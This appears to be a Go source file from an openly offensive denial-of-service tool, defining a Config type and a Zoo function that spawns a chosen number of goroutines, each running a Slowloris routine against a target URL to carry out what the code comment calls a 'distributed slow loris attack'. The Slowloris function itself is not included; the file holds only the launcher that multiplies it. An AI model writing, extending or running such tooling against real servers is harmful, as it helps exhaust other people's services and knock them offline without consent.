package main

import (
	"context"
	"fmt"
	"sync"
	"time"
)

// Config holds configuration available for constructing a slowloris zoo.
type Config struct {
	URL   string
	Count int64
}

// Zoo is a function that can perform distributed slow loris attack based on
// the given parameters.
func Zoo(c Config) error {
	ctx := context.Background()
	wg := sync.WaitGroup{}

	for i := int64(0); i < c.Count; i++ {
		wg.Add(1)
		go func(index int64) {
			fmt.Printf("Slowloris %d\n", index)
			Slowloris(ctx, c.URL)
			time.Sleep(1 * time.Second)
			wg.Done()
		}(i)
	}

	wg.Wait()
	return nil
}
